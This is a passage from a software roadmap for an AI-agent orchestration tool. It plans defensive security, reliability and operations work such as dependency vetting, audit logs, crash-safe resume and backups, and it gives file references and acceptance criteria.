**Done when:** `pnpm check` runs the ratchet and sweep green on main. Removing a guard, such as a SELF_DEFAULTS entry in packages/security/src/commands.ts or the redaction in log-sink, turns the build red. Fixing a known exposure, such as the 127.1 alias, also turns it red until its entry is changed to denied. Adding a known_exposure entry without a finding id and owner, or raising their count, fails CI. The sweep reports zero raw canaries in any listed sink, apart from entries marked known_exposure. docs/systems/security.md points to the ratchet file for its guarantees.

**Check before building:** Little that is third-party. The PTY-chunk canary needs node-pty to load on the CI runners (it is already used by terminal tests). Windows path spellings need the windows-latest job (ci.yml:57). The claudeToolPolicy and argv assertions describe what the Control Center passes to Claude Code. Whether the CLI then honours deny patterns, --setting-sources and hooks is Claude Code behaviour, which only `pnpm verify:agents --run` against the real CLI can confirm.

### SEC-6 · New-dependency check for agent changes

**Next** · Effort M · Impact 4/5 · Needs: nothing first

When a task adds packages, the Control Center compares the task's manifests and lockfiles with the baseline and lists every new direct and transitive package. For each it shows age, install scripts, deprecated status, known malicious-package advisories, and whether the name looks like an existing or popular package. Reviewers, the final report and the release card see this section. A malicious-package advisory, a look-alike of an existing dependency, or a package under 7 days old with an install script stops the task until the operator waives it. npm and yarn installs that the Control Center runs skip unapproved install scripts, closing the gap pnpm and Bun already close by default.

**Verified gap:** The gap is real but the problem statement overstates it. Confirmed: node.install (packages/tools/src/packs/runtime.ts:78-91) and node.add_dependency (:92-108) are Level 2. add_dependency only refuses names that start with '-' (:99-100, F-33) and nothing checks what a name resolves to. No `--ignore-scripts`, OSV, typosquat or look-alike logic exists anywhere in apps/ or packages/ (grep finds nothing). The gate codes are tests|review|verify|required_check|protected_paths (apps/orchestrator/src/chairman/gate.ts:24), with no dependency evidence.

**First steps**

1. Offline diff. Add packages/tools/src/packs/security.ts, the home I28 will extend, with a Level 1 read-only op `security.new_dependencies {base}`. It diffs package.json plus package-lock.json (v2/v3, including `hasInstallScript`), pnpm-lock.yaml v9 and yarn.lock against `git show <base>:<path>`, lists new direct and transitive packages, and scores name distance against existing dependencies and a small bundled list of popular names. Register it in packages/tools/src/index.ts builtinProviders and the review profiles in profiles.ts, with fixture tests in packages/tools/test/packs.test.ts.
2. Registry enrichment. Use rest.ts with loopback overrides (for example ACC_NPM_REGISTRY_URL and ACC_OSV_URL) to add publish age, deprecated status, install scripts and OSV MAL- ids. Skip any package whose `resolved` host is not the public registry. A lookup failure yields 'unverified'.
3. Evidence and gate. Add a `dependency_changes` placeholder (packages/shared/src/prompts.ts plus engine/context.ts vars) to the reviewer and verifier templates, a section in engine/report.ts and release/service.ts describe(), and a `dependencies` GateFailure in chairman/gate.ts for high-confidence findings, cleared only by an operator waiver. The install-script hold for npm and yarn (runtime.ts node.install/add_dependency and recovery.ts installCommand, with a per-repository allowlist in migration 20+) follows as a separate PR shared with I23.

**Done when:** A fixture task that adds a dependency whose name is one edit away from an existing one, plus a package-lock entry with `hasInstallScript: true`, shows both under 'New dependencies' in the Review prompt, the final report and the release card. The task stops short of READY with a `dependencies` gate failure until the operator waives it. A loopback OSV stub returning a MAL- id also blocks the task. A registry outage shows 'unverified' without blocking. A package resolved from a private registry is never sent to the stubs. The test proves no request was made.

**Check before building:**

Confirm before building:
- The npm registry: whether abbreviated metadata (Accept: application/vnd.npm.install-v1+json) exposes per-version `hasInstallScript`/`deprecated`, and whether the full packument is needed for per-version `time`. Downloads come from api.npmjs.org/downloads/point/last-week/&lt;pkg>.
- The OSV API: /v1/querybatch returns MAL- ids from the OpenSSF malicious-packages feed for npm, PyPI and crates.
- pnpm 10/11 (onlyBuiltDependencies / allowBuilds) and Bun (trustedDependencies) already skip dependency scripts by default.
- `npm ci --ignore-scripts` also skips the root project's own lifecycle scripts.

### SEC-7 · Security audit trail with who-did-it from the cloud

**Later** · Effort L · Impact 3/5 · Needs: nothing first

When someone approves or steers a task from the cloud, the node records who it was: the email the cloud already sends and the node currently throws away. The timeline shows 'Approved from the cloud by …'. Security-relevant decisions (tool denials, approvals, credential use, billing and auto-approve changes, pairing) are collected into one append-only, hash-chained audit log, with a Security → Audit view and export. When the node is paired, checkpoint hashes are anchored in the cloud; until an OS boundary exists (I21), that anchor is what makes the log tamper-evident. Cloud member roles are deferred until more than one person operates a node.

**Verified gap:** No ledger exists: grepping for prev_hash/security_audit/resolved_by/runtime-audit finds nothing. The approvals table (apps/orchestrator/src/db/migrations.ts:217-236) has resolved_at but no resolved_by. Cloud access is all-or-nothing: apps/cloud-control/src/auth/access.ts:91-96 checks only ALLOWED_EMAILS, and routes/control.ts has no role check. The dashboard never reads /api/cloud/audit (control.ts:176); a grep of apps/dashboard/src finds no use. REFUTATIONS: (a) The actor already reaches the node.

**First steps**

1. Add a migration with remote_commands_received.actor and approvals.resolved_by. The dispatcher stores command.createdBy on the receipt, and the approval, directive and cancel routes look up the actor by the receipt of x-acc-remote-request, only while that command is claimed. The timeline and ApprovalsPage show the approver.
2. New apps/orchestrator/src/services/security-audit.ts: a bus subscriber writing an append-only security_audit table (seq, ts, origin, kind, subject, decision, level, redacted detail, prev_hash, hash). Add GET /api/security/audit and /api/security/audit/verify, and a Security → Audit view built from packages/ui.
3. Cloud: an Activity view on NodesPage reading /api/cloud/audit and /api/cloud/health. When paired, send periodic checkpoint hashes through the remote egress allowlist and show 'verified against cloud' in the Audit view.

**Done when:** Approving from the cloud records the approver's email in approvals.resolved_by and on the local timeline. A local request that sets x-acc-remote-request with an unknown or finished command id gets no actor. /api/security/audit/verify reports OK and flags a hand-edited or deleted row. With a paired node, a rewritten local chain no longer matches the cloud checkpoints. The cloud dashboard lists commands with requester and outcome.

**Check before building:** The Cloudflare Access JWT email claim is stable per person (already relied on). DPAPI CurrentUser scope means same-user processes can unseal, which is the reason for the off-machine anchor. D1 migration rollout for any member table.

### SEC-8 · Security posture page and credential lifecycle

**Later** · Effort L · Impact 3/5 · Needs: nothing first

One local-only Security view lists every risk signal the Control Center already knows about but scatters or only logs. Each signal comes with a severity and a one-click fix: withheld ambient provider tokens, API-billing variables in the environment, billing mode and auto-approve ceiling, agents that load user CLI config, unscoped, stale or vault-held credentials, paired apps and their last use, trusted MyVault and extra origins, cloud pairing, and plaintext browser sessions. The same pass closes the leftover audit items: it refuses Origin: null on /ws, seals saved browser sessions (F-32), and stops any credential or MCP mapping from taking a model-billing variable name. Next, credentials gain verified-at and expiry dates, read from the provider's own read endpoint. Generated secrets get a restart-safe rotation: generate, save to MyVault, deploy to staging and then production with typed approval, verify, retire, all recorded.

**Verified gap:** No posture aggregate exists anywhere (grep -i posture over the repo finds nothing; the dashboard has no Security page, only apps/dashboard/src/pages/tools/CredentialsTab.tsx and ConnectedAppsTab.tsx). The signals are real but scattered. (1) Ambient provider tokens are only logged, at apps/orchestrator/src/main.ts:35-36. detectApiCredentials (packages/security/src/env-guard.ts:166) is exported but never called.

**First steps**

1. Posture read-model and page: add GET /api/security/posture (new apps/orchestrator/src/http/security-routes.ts registered in http/server.ts:60-68) composing detectAmbientCredentials/detectApiCredentials (env-guard.ts:157-172), settings, agents' loadUserConfig, credentials list (repositoryIds null, lastUsedAt older than 90 days, heldForVault), connected apps, vaultBridge.status() origins, config.allowedOrigins, remote.status() and a count of tool-state/browser-sessions/*.json. Add an orchestrator test that primes a credential and asserts its value never appears in the response. Add a Security tab in apps/dashboard/src/pages/ToolsPage.tsx built from packages/ui components, plus an e2e spec in both themes.
2. Hardening PR with tests: refuse Origin 'null' for /ws in http/security.ts:74 (api.test.ts case); add API_BILLING_ENV_VARS to RESERVED_ENV_VARS (credentials.ts:95-101) and enforce reservedEnvVar in create/update (:297/:332) and for MCP envCredentials variable names (shared/tools.ts:333 schema or tools/mcp.ts create/update); add seal/open to CredentialHost (sdk.ts:119) backed by broker.sealValue with AAD 'browser-session:&lt;name>', switch browser.ts/browser-session.ts to in-memory storageState, and seal legacy plaintext files the first time they are read.
3. Migration 20 adding credentials.expires_at and last_verified_at, plus read-only credential.verify operations (github-api.ts GET /user with its expiration header; cloudflare-api.ts tokens/verify), shown on CredentialsTab and the posture page. Follow with a credential_rotations table and credential.rotate for generated secrets only, driven by a restart-safe state machine and tested against test/fake-wrangler.ts.

**Done when:** The Security tab lists every posture check with severity and fix action, in both themes, with axe clean. A test proves the posture response contains no registered secret value. A /ws upgrade with Origin: null answers 403. Creating, generating, importing or MCP-mapping a credential as ANTHROPIC_API_KEY or OPENAI_API_KEY is refused. After browser.close with saveSession, the file under tool-state/browser-sessions holds no cookie value in plaintext, and browser.open with that session still signs in. A stored GitHub or Cloudflare token shows 'verified &lt;date>, expires &lt;date>'. A generated secret can be rotated end-to-end against the fake wrangler: a crash between deploy and retire resumes without losing either value, and a credential_rotations row records each step.

**Check before building:** Cloudflare: GET /client/v4/user/tokens/verify returns status and expires_on for user tokens, but account-owned tokens need /accounts/{id}/tokens/verify. Confirm which one stored tokens are. GitHub: the GitHub-Authentication-Token-Expiration header appears only for PATs that have an expiry, not for non-expiring tokens or gh OAuth tokens. Playwright: browser.newContext({ storageState: object }) and context.storageState() with no path must work in the pinned version, so a sealed session never touches disk in plaintext. Connected-app token expiry or rotation needs a matching change in the Private Browser client (a separate codebase).

## REL — Reliability and throughput

### REL-1 · Agent checks tool, pnpm/Jest narrowing and an early commit-hook probe

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Agents get one tool, checks.run, that runs the repository's own configured test, lint, typecheck or build command, narrowed to the affected files. The orchestrator records the result, and a whole-suite pass on unchanged files spares the Test stage a second run. Test narrowing extends from npm and Vitest to pnpm, yarn and Jest. After the first passing Test stage, a throwaway commit checks the repository's commit hooks. A hook rejection then reaches the fixer early, instead of after Review and Verify, or being hidden as a 'cleanup' message when the task completes.

**Verified gap:** No `checks.*` capability exists. packages/tools/src/packs/ has no checks pack, and OperationContext (packages/tools/src/sdk.ts:153-178) has no checks host. Narrowing is limited in three places: targeted-tests.ts:25 (NPM_SCRIPT matches npm only), targeted-tests.ts:127 (narrowCommand is Vitest-only) and test-selection.ts:65 ('Only Vitest commands can run affected tests'). AFFECTED_TESTS_PLAN.md:243-244 lists Jest and pnpm/yarn as Found for Later. LEAD_TIME_PLAN.md:310-313 lists the checks.run idea and :321 lists the late commit-hook problem (TASK-0005, 14.8 min); both are open.

**First steps**

1. Add a checks.run provider (packages/tools/src/packs/checks.ts) and a ChecksHost in sdk.ts, implemented through ToolService.attach in apps/orchestrator/src/tools/service.ts. The host resolves only the repository's configured command, narrows it with targetedCommand or narrowCommand, classifies it and runs it within a bounded timeout. Add 'checks.*' to DEVELOP in profiles.ts, name the tool in prompts/implementer.md and prompts/fixer.md, and add tests in apps/orchestrator/test/tools.test.ts.
2. Add an append-only migration for test_runs.origin. Agent runs record a tree_id only when committableTree matches before and after the run. findReusableRun (store.ts) accepts an agent-origin row only for the unnarrowed configured command. runners.ts labels the reuse as 'Reused: agent checks.run at hh:mm'.
3. Add a commit-hook probe: a probeCommit helper in packages/git/src/team.ts (child worktree at HEAD, the task's own paths, git commit), called in runners.ts after a passing tests stage when hooksInstalled(pre-commit, commit-msg) is true. It is recorded as a 'commit hook (probe)' test run, and a rejection returns tests_failed. Also make tooling.ts finalizeWorktree turn a hook rejection into a gate limitation in the report, not a cleanup note.

**Done when:**

1. In a repository with a configured Vitest test command, an implementer's checks.run call appears as a test_runs row with origin 'agent' and a tree id. A later Test stage on the same tree reports 'Reused' for the full command and never for a narrowed one.
2. A pnpm repository and a Jest repository each get a narrowed affected-tests run, proven by real-runner integration tests, and fall back to the full suite whenever narrowing cannot be proven safe.
3. A repository whose pre-commit hook rejects the change sends the task to Fix straight after Test, with the hook output in the fixer's context. Review and Verify never ran on the rejected tree, and the task branch and operator checkout show no probe commit.
4. In normal-development, a hook rejection at completion shows as a limitation in the final report.

**Check before building:**

1. The CLI's own timeout for MCP tool calls. The adapters set none: agent-codex/src/index.ts:181-183 passes only command, args and env_vars. Codex's per-server `tool_timeout_sec` is reportedly 60 s by default, and Claude Code uses MCP_TOOL_TIMEOUT. A multi-minute checks.run would be cut off. Either set the timeout per server or make checks.run bounded or asynchronous (start, then status).
2. pnpm 7+ and yarn 1/berry handling of `test -- files` (whether a literal `--` reaches Vitest or Jest).
3. Jest `--changedSince` behaviour with untracked files (jest-changed-files).
4.

### REL-2 · Run isolated tasks side by side safely

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Tasks that each work in their own worktree can run at the same time in one repository, up to a limit the operator sets, which defaults to today's one task. Heavy test suites and App checks for that repository still take turns. Each App check gets its own free port, which also fixes a collision that already happens when two repositories' App checks both use port 5199. A machine-wide cap and a free-disk check make new work wait with a clear reason, instead of failing halfway on a full disk or an overloaded machine.

**Verified gap:**

Serialisation is real. schedule() (engine.ts:803-829) queues any task whose repositoryHolder (engine.ts:839-848) finds a running task, or a task with a baseline, in the same repository, even when both are isolated. Isolated tasks already skip the writer lock (engine.ts:939-942). LEAD_TIME_PLAN.md:319 and :323-325 name this as the next recommended task (TASK-0003 waited 16.3 min).

There is no machine-wide task cap. schedule() launches every queued task whose repositories are free, and executionSettingsSchema (packages/shared/src/tools.ts:289-304) caps only teamWorkerLimit.

**First steps**

1. Add execution.maxRunningTasks, a machine-wide cap enforced in engine.ts schedule() with a 'queued' blocker naming the cap. Add a per-run App check port: detectTooling (services/repositories.ts) writes a `{port}` placeholder, and runners.ts runVerify resolves a free port before gateCommand. Existing literal 5199 values are rewritten only when both devCommand and devUrl contain them. Add a test with two repositories verifying at once.
2. Add a per-repository maxParallelTasks (default 1, as an append-only repository column or in the runtime settings), consulted in repositoryHolder only when both tasks are git.isolated single-repository worktree tasks. Add a per-repository heavy-check slot (the WorkerSlots pattern) taken by the tests and verify stages, with a 'Waiting for a check slot' blocker. remote/guards.ts refuses raising the setting from the cloud. Add engine.test.ts cases.
3. Add services/resources.ts, a ResourceGovernor that checks statfs of the data folder and repository roots before createWorktree, baseline checks and team checkouts, with a 'resources' blocker and automatic re-admission. Its snapshot appears in /api/health. The process cap and Job Object containment follow as a separate slice.

**Done when:**

1. With maxParallelTasks = 2, two isolated tasks in one repository run their agent stages at the same time. Their test stages run one after the other, with the waiting one showing 'Waiting for a check slot'.
2. A non-isolated task, a release or a Source Control mutation still waits.
3. App checks in two repositories that previously both used 5199 pass at the same time.
4. Below the configured disk reserve, a new task waits with a 'resources' blocker and starts on its own once space is freed.
5. The setting cannot be raised from a cloud command (guard test).

**Check before building:**

1. Dev-server flags: vite `--port` and `--strictPort`, `next dev --port`, `wrangler dev --port`. A framework config that pins a port may ignore the flag.
2. Concurrent pnpm or npm installs that share one store or cache are safe.
3. Windows Job Object nesting (Windows 8 and later), and whether the Codex or Claude CLIs create their own jobs or need breakaway.
4. The subscription usage windows are shared, so running tasks in parallel spends each agent's window proportionally faster. That is why I17's per-agent slots matter.

### REL-3 · Always-on Linux execution node

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Adds a supported way to run the Control Center as an unattended Linux service on a small server, so tasks sent from the phone run even when the Windows PC is off. The node keeps its own local orchestrator and database, pairs with the cloud by dialling out, and never opens a port. A readiness report shows whether it can really do work: CLIs signed in on subscription billing, a browser for App check, git push credentials, disk space and clock. The cloud's existing Automatic routing already picks any online node holding the repository. This work adds a preference for the always-on node and shows on the task card why a node was chosen.

**Verified gap:** Gap confirmed. There are no Linux service scripts: scripts/ holds only scripts/windows/{install,start-control-center,stop-control-center,uninstall,privileged-helper}.ps1, and no systemd, node-doctor or node-role code exists anywhere. The cloud plan lists this as Found for Later #1, 'Priority: High' (docs/plans/cloud-control-plane.md:1111-1116), and as the next recommended task (:1152), and excludes it from that plan's scope (:232). nodeCapabilitiesSchema (packages/shared/src/remote.ts:247-253) has no role field. QUEUED_TASK_TTL_SECONDS is 24 h (packages/shared/src/remote-operations.ts:77).

**First steps**

1. scripts/linux/install.sh, start.sh, stop.sh and pair.sh. They create a systemd --user unit (Restart=on-failure, ExecStart `node apps/orchestrator/dist/main.js`, ExecStop calling POST /api/service/shutdown {mode:'drain'} with the local token), enable linger, and never set ACC_HOST/ACC_ALLOW_REMOTE. pair.sh calls POST /api/remote/pair. Document all of this in docs/systems/remote-node.md.
2. A read-only node readiness report (for example GET /api/service/readiness, plus `pnpm node:doctor`). It reuses the agents service healthCheck (billing), browser.ts Chromium resolution, a git credential-helper probe, free disk and clock skew. It is shown in Settings → Remote, summarised in the node hello capabilities, and reports Windows-only packs as unavailable rather than passing.
3. An optional `role: 'always-on'` in nodeCapabilitiesSchema (packages/shared/src/remote.ts:247) and in resolveNode (apps/cloud-control/src/routes/control.ts:275): prefer the source node, then an always-on node, then any online node. Return the chosen node id and a reason in the command response, and show them on the task card.

**Done when:** On a clean Ubuntu VM, install.sh brings up the service under a non-root user, with the API reachable only on 127.0.0.1. The node pairs through pair.sh and appears in the cloud as 'always-on' with a green readiness report, or a report naming each missing piece. With the Windows node powered off, a task created from the phone with 'Automatic' runs on the Linux node in an isolated worktree, and the task card says why it went there. stop.sh drains running tasks instead of killing them.

**Check before building:** 1. Claude Code headless sign-in: confirm that `claude setup-token` (a long-lived OAuth token in CLAUDE_CODE_OAUTH_TOKEN) makes `claude auth status` report a firstParty/OAuth method that probeAuth classifies as subscription. 2. Codex: confirm `codex login --device-auth` or an equivalent device-code flow works on a headless box. 3. Confirm the Anthropic consumer terms and OpenAI ChatGPT-plan terms allow the operator to run the subscription CLIs on their own server. 4. systemd --user needs `loginctl enable-linger` to run without an open login session. 5. Playwright Chromium needs its OS dependencies (`npx playwright install-deps`) on the target distro. 6.

### REL-4 · Tool failures that explain themselves: hints, safe retries and package facts

**Later** · Effort M · Impact 3/5 · Needs: nothing first

When a Control Center tool call fails because of the environment (missing dependency, busy port, network drop, rate limit, full disk, locked Git index), the agent gets a one-line diagnosis and suggested fix instead of raw output. Safe read-only calls retry once on their own. A call whose provider could not even start moves to another installed provider. A new read-only package lookup tells agents which versions exist and which are deprecated or yanked before they add or upgrade a dependency. Web search can use a self-hosted SearXNG, and a paid search service only if the operator chooses it.

**Verified gap:** invoke runs only route.route (apps/orchestrator/src/tools/service.ts:445). After a failure it only increments the per-task failure count used for ranking (service.ts:537); the alternatives the router returns (packages/tools/src/router.ts:73) are never used. formatForModel (service.ts:709-720) prints no hint. classifyFailure and planRepair run only for test-stage commands (runners.ts:805-808). RULES (packages/tools/src/recovery.ts:52-73) have no disk-full, out-of-memory, git index.lock, Docker-daemon or EACCES rule.

**First steps**

1. Recovery hints. In invoke step 7 (apps/orchestrator/src/tools/service.ts), classify failed results from the stdout and stderr tail with classifyFailure and attach `recovery {category, evidence, suggestion}` to OperationResult (packages/tools/src/sdk.ts). formatForModel prints a 'hint:' line. Add hint-only RULES to recovery.ts (disk_full, out_of_memory, git_index_lock, docker_down, permission_denied). test_failure and build_failure stay unrepaired. Add unit tests for the new rules.
2. Safe retry and failover. Add `idempotent?: boolean` on ToolOperation. readOnly or idempotent calls retry once after backoff on transient_network or rate_limit, logged in recovery_attempts. A spawn failure re-routes once to the next provider in the router's alternatives, recording attempt=2 and recoveryOf, with policy re-decided for the new provider. Paid providers never appear as alternatives. Add tools.test.ts cases (for example, pwsh missing falls back to bash).
3. Add packages/tools/src/packs/registry.ts with registry.package_info for npm and PyPI first: Level 1 readOnly, cached, with a loopback override for tests. Register it in builtinProviders and add it to INSPECT in profiles.ts. SearXNG as a second web.search provider, behind a configured URL, follows.

**Done when:**

1. An agent's node.run_script call that fails with EADDRINUSE or 'Cannot find module' returns output with a 'hint:' line, and the category is recorded.
2. A readOnly http.request that hits ECONNRESET succeeds on its one automatic retry, recorded as attempt 2.
3. A shell.run whose preferred shell fails to start runs on the next installed shell, and both attempts are visible in the Execution tab.
4. A Brave provider is never used unless selected in Settings (test).
5. registry.package_info reports the latest version, dist-tags and the deprecation or yanked status for an npm and a PyPI package, against a loopback fixture in CI.

**Check before building:**

1. SearXNG answers JSON only when the instance enables `search.formats: [html, json]`, and many public instances refuse API use, so plan on a self-hosted URL.
2. Brave Search API plans, pricing and free-tier availability.
3. crates.io requires a descriptive User-Agent and about 1 request per second.
4. npm abbreviated metadata versus full packuments for `deprecated` and `engines`, PyPI JSON `yanked`, proxy.golang.org, and Maven Central search availability.
5. The GitHub releases API allows 60 requests per hour unauthenticated, so changelogs need the brokered github credential or caching.

### REL-5 · Crash-safe resume: unknown-outcome tool calls and a state consistency check

**Later** · Effort L · Impact 3/5 · Needs: nothing first

When the orchestrator crashes during a deploy, a PR creation or a secret update, the Control Center today records the call as 'cancelled' and may automatically resume and repeat it. Such calls will instead be marked 'outcome unknown'. The system checks what actually happened (for example, is the PR there?) before the task continues, and tells the agent which effects already took place. A read-only consistency check runs after every restart and stops auto-resume for any task whose stored state contradicts itself. A crash-injection test matrix then checks that this holds at every risky point.

**Verified gap:**

interruptRunningExecutions (apps/orchestrator/src/tools/store.ts:310-311) marks every 'running' tool row 'cancelled' ('Interrupted by an orchestrator restart'). It runs at app.ts:244, before chairman.onStartup (app.ts:256). onStartup then resumes every supervised INTERRUPTED task (chairman.ts:769-779) when resumeAfterRestart is on, which is the default (packages/shared/src/schemas.ts:417).

It is worse than the proposal says. Child processes started by tool calls are not pid-tracked: tool_executions has no pid column (migrations.ts:667-693).

**First steps**

1. Add 'outcome_unknown' to TOOL_EXECUTION_STATUSES (packages/shared/src/tools.ts). interruptRunningExecutions (apps/orchestrator/src/tools/store.ts) marks rows with network, production, infrastructure or credential effects, or Level 3 and above, as outcome_unknown. chairman.ts onStartup skips tasks that have such rows and gives them a blocker naming the calls. context.ts previousAttempt lists the effectful tool calls of the interrupted stage.
2. Add an append-only migration for tool_executions pid, process_started_at and reconcile_key. ToolService records the child pid for spawn-based operations, and app.ts recover() kills or waits out a live leftover tool child (F-11 rule) before classifying its row. Add reconcile() for github.pr_create and github.issue_comment (found by head branch or marker) as the first two operations.
3. Add apps/orchestrator/src/db/invariants.ts: read-only SQL and filesystem checks, run after recover() and exposed at GET /api/health/invariants. A violation raises a system event and a 'consistency' blocker that exempts the task from auto-resume. Then add FaultPoints and a sampled test/crash-matrix.test.ts, with the full matrix run nightly.

**Done when:**

1. A test kills the services while a Level-4 github.pr_create is running and reopens them on the same data folder. The row reads outcome_unknown, then resolves to succeeded with the PR found, or to not-happened. The supervised task is resumed only after that.
2. With resolution impossible, the task waits with a blocker naming the call, and the agent's next prompt lists it.
3. GET /api/health/invariants returns no violations after every crash-matrix scenario.
4. A deliberately corrupted state (two active stages on one RUNNING task) blocks auto-resume with a 'consistency' blocker.

**Check before building:**

1. Whether `gh pr list --head <branch>` and the issue-comment listing can find a marker immediately (GitHub search is eventually consistent, so do not use search).
2. Whether `wrangler deploy` or `wrangler versions deploy` accepts a --message or --tag that `wrangler deployments list` returns, to find a deploy by marker. Confirm per Wrangler version.
3. The GitHub Actions secrets API returns only name and updated_at, so a secret can be shown updated but not shown to hold the value.
4. Windows process creation-time lookup costs about 1 s per call through CIM.

## OPS — Operations and observability

### OPS-1 · Operations safety net: backups, crash recovery, guided upgrade, then metrics

**Now** · Effort L · Impact 4/5 · Needs: nothing first

Protect the one data folder that holds all workflow state. It gets a daily online backup with an integrity check, a restore script, and an upgrade script that backs up first, confirms the new build is running, and rolls back to the old build and database if startup fails. An orchestrator crash is detected on the next start and restarted by an opt-in supervisor. System problems such as a crash, a failed backup, low disk, an oversized DB or an expired agent login send a one-time phone alert. Then add a local-only metrics endpoint and an Operations page with event-loop lag, stage durations and tool failures, plus a simulated-load benchmark whose SLO targets are set from measured baselines rather than guessed.

**Verified gap:** The gap is real in almost every part. I found nothing that monitors the event loop and nothing that serves metrics: a grep for monitorEventLoopDelay, perf_hooks, eventLoop and /api/metrics across apps, packages and scripts returns nothing. /healthz returns {ok:true} (apps/orchestrator/src/http/server.ts:73). /api/health returns static fields only (apps/orchestrator/src/http/routes.ts:121-135; ServiceHealth in packages/shared/src/types.ts:577-589). schemaVersion() exists in apps/orchestrator/src/db/database.ts:76, but nothing calls it.

**First steps**

1. BackupService (new apps/orchestrator/src/services/backups.ts, started from main.ts after recover()). Once a day it runs db.backup() to &lt;data>/backups/acc-YYYYMMDD.db, opens the copy read-only for PRAGMA integrity_check, keeps N=7 copies, and runs wal_checkpoint(TRUNCATE) afterwards. Extend ServiceHealth (packages/shared/src/types.ts:577) and /api/health (http/routes.ts:121) with schemaVersion (db/database.ts:76), dbBytes, walBytes, dataDirFreeBytes (statfs as in packages/tools/src/environment.ts:41) and lastBackupAt. Add apps/orchestrator/test/backups.test.ts and update the §Backups section of docs/systems/operations.md.
2. scripts/windows/restore-backup.ps1, which refuses while runtime.json's /healthz answers, and scripts/windows/upgrade-control-center.ps1. The upgrade script requires fast-forward only and a clean tree, triggers a backup, runs the frozen install and build, stops with -Drain, starts, and polls /api/health until build.commit equals HEAD. On failure it checks out the previous commit, rebuilds, restores the backup and starts again. Also add a startup refusal in database.ts migrate() when the DB schema is newer than the code, with a test in apps/orchestrator/test/migrations.test.ts.
3. Crash detection and system alerts. At startup, a leftover runtime.json whose pid is dead marks a crash. Migration 20 adds a system_alerts ledger. AlertKind gains 'system' in services/alerts.ts with dedupe keys for restart after crash, backup failed, disk low, DB over threshold and agent AUTH_FAILURE, behind a new Settings toggle. `start-control-center.ps1 -Supervise` restarts only on a crash exit, with backoff and a restart cap, and rotates both .log and .err.

**Done when:**

- A backup appears under &lt;data>/backups every day, passes integrity_check, and rotation keeps exactly N copies.
- /api/health reports schemaVersion, dbBytes, walBytes, dataDirFreeBytes and lastBackupAt. None of these adds a path to the remote health reply.
- Under -Supervise, killing the node process restarts it within 30 s, and exactly one 'restarted after a crash' alert is recorded and sent.
- `stop-control-center.ps1 -Drain` is never followed by a restart, and a startup failure stops the loop.
- On a deliberately broken commit, upgrade-control-center.ps1 ends with the previous build.commit in /api/health and the pre-upgrade database restored.
- restore-backup.ps1 refuses while the orchestrator answers /healthz.
- A database with a newer schema than the code refuses to start with a clear message.
- Later slices: a local-only GET /api/metrics and an Operations page built from packages/ui components, green in both Playwright themes. `pnpm bench` prints event-loop p99 and route p95 for 8 simulated tasks, and a separate bench.yml publishes the numbers as an advisory.

**Check before building:**

Confirm these before building:

- better-sqlite3 db.backup() under WAL while the same connection keeps writing: the online backup copies incrementally. Measure its duration and event-loop impact on a large DB, and use the progress callback or a worker if it blocks.
- Node 22's perf_hooks.monitorEventLoopDelay is built in, so no new dependency is needed.
- Windows PowerShell 5.1 compatibility for a long-running hidden `-Supervise` loop started from the -AutoStart sign-in shortcut. Also check whether Register-ScheduledTask with restart-on-failure works per user without admin; that would be an alternative.

### OPS-2 · Discard drafts, archive finished tasks, see what storage holds

**Next** · Effort M · Impact 3/5 · Needs: nothing first

Operators can discard a draft that never started (with its attachments), archive finished tasks so lists stay readable, and see in Settings what the data folder holds by category, repository and largest tasks. As automated intake, automations and goal planning start creating drafts in bulk, lists would otherwise fill with dead drafts. Today a repository cannot be removed once any task, even an unstarted draft, refers to it. Automatic pruning of old logs stays with I49's retention work.

**Verified gap:**

Confirmed:
- The task routes are create, get, PATCH (draft only) and start, pause, resume, cancel, retry, reroute, assignments and directives (apps/orchestrator/src/http/routes.ts:150-187). There is no delete or archive.
- No `DELETE FROM tasks` and no execution_logs pruning exist anywhere in apps/orchestrator/src. The only time-based prune is capacity_snapshots (usage/capacity.ts:89-98). The log cap is 50,000 lines (engine/log-sink.ts:9). ArtifactService.taskDir (services/artifacts.ts:47-51) has no delete.

**First steps**

1. Discard draft. Add engine.discardDraft(id) (engine.ts, DRAFT-only). It deletes the task row (children cascade), removes &lt;dataDir>/tasks/&lt;id> through ArtifactService, and publishes the existing `task.deleted` bus event, so the dashboard and cloud mirror drop it with no new wire type. Add an operator route DELETE /api/tasks/:id (routes.ts) and a confirm dialog (with an attachments warning) and bulk discard in TasksPage.tsx. Test that a repository whose only task was a discarded draft can then be removed.
2. Archive. Add migration 20 with `tasks.archived_at` and archive/unarchive routes for terminal tasks. listTasks (store.ts:839) hides archived tasks unless `archived=true`. Carry archivedAt in the task summary so the cloud mirror shows it. Add a draft-only `task.discard` op in packages/shared/src/remote-operations.ts, checked by remote/guards.ts.
3. Storage view. Add a read-only GET /api/storage that sums bytes per table (dbstat, or a fallback), task artifacts, worktrees and workspaces, baselines, browser sessions and logs, per repository and for the top tasks, rendered in SettingsPage.tsx → Storage with packages/ui components. Hand retention and its pin-set rules to I49.

**Done when:** A never-started draft can be discarded from the dashboard after confirmation. Its row, children and task folder are gone, and it disappears from a connected cloud dashboard without a resync. Discarding a QUEUED or finished task is refused by the engine, locally and from the cloud. The repository can then be removed. Archived tasks vanish from the default list, reappear under an 'Archived' filter, keep their report and patch, and can be unarchived. Settings → Storage shows byte totals by category, repository and largest task that match `du` on the data folder within 5%. The e2e matrix passes in both themes.

**Check before building:** Confirm that the SQLite bundled with better-sqlite3 13.x is compiled with SQLITE_ENABLE_DBSTAT_VTAB, which the per-table byte breakdown needs, and fall back if not. Nothing else is external.

## AGT — Agent providers and capacity

### AGT-1 · Respect usage limits: admission, auto-resume at reset, Codex parity

**Now** · Effort L · Impact 5/5 · Needs: nothing first

When a plan hits its usage limit, Autopilot tasks sit in 'waiting for usage reset' until someone clicks Resume, and nothing stops background work (Chairman, Ask, learning) from draining the same window first. This makes the Control Center refuse new runs on an agent that is known to be exhausted, including the Chairman and Ask reasoners. Opt-in, it resumes blocked tasks once, by itself, just after the provider's stated reset time. Later it adds per-agent concurrency slots with stage runs prioritised over background work, and brings Codex's model, reset time and price data up to Claude's level.

